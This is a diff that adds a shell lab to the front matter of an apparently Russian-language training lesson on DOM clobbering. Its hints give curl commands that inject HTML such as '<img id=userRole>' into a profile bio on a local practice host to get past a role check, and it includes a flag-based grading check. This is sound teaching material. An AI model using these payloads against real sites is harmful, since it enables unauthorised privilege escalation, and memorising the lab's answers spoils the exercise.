@@ -12,6 +12,19 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Как без JavaScript переопределить window-переменные через HTML-элементы и обойти проверки, санитайзеры и CSP."
+lab:
+  kind: shell
+  title: "Практика: DOM clobbering ломает проверку роли"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Проверь HTML-инъекцию в bio: curl -s 'https://target.local/profile?bio=<a id=foo>x</a>' -b 'session=me'"
+    - "Тег вернулся как есть — HTML-инъекция возможна."
+    - "Код проверяет window.userRole. Вставь <img id=userRole> — элемент станет truthy."
+    - "Отправь инъекцию и сохрани ответ: curl -s 'https://target.local/profile?bio=<img id=userRole>' -b 'session=me' > found.txt"
+
 ---
 
 ## Вопрос, с которого всё начинается
